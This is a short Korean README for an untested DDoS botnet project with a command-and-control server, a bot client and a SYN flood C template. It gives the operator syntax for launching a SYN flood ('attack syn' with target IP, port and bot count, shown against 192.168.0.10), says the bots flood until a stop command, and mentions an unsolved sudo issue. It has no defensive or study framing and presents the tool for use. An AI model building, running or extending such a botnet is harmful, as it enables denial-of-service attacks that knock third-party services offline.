test_ver 작동 테스트 되지 않은 코드

폴더 구조
- cnc_server.py
- bot_client.py
- templates/
    - syn_flood_loop.c
 
> 동작방식
attack syn <타겟IP> <타겟PORT> <bot_count>
(ex: attack syn 192.168.0.10 80 2)

봇은 해당 타겟으로 stop 명령 받을 때까지 SYN Flood를 지속합니다.

stop <bot_count>  로 종료

sudo 해결이 안됨. 공격 명령 실행시 서버측에서 passwd 입력해줘야함
